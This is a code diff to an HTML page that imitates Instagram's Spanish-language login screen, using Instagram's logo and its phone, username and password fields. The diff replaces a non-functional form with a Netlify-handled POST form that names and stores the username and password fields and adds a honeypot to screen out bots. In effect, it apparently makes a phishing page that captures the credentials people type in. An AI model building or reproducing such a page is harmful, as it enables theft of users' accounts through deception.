@@ -179,11 +179,15 @@
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
     </div>
 
-    <form>
-      <input type="text" placeholder="Teléfono, usuario o correo electrónico" required>
-      <input type="password" placeholder="Contraseña" required>
-      <button type="submit">Iniciar sesión</button>
-    </form>
+  <form name="login" method="POST" netlify netlify-honeypot="bot-field">
+    <input type="hidden" name="form-name" value="login" />
+    <p class="hidden">
+      <label>Don’t fill this out if you're human: <input name="bot-field" /></label>
+    </p>
+    <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
+    <input type="password" name="password" placeholder="Contraseña" required />
+    <button type="submit">Iniciar sesión</button>
+  </form>
 
     <div class="divider">
       <hr>
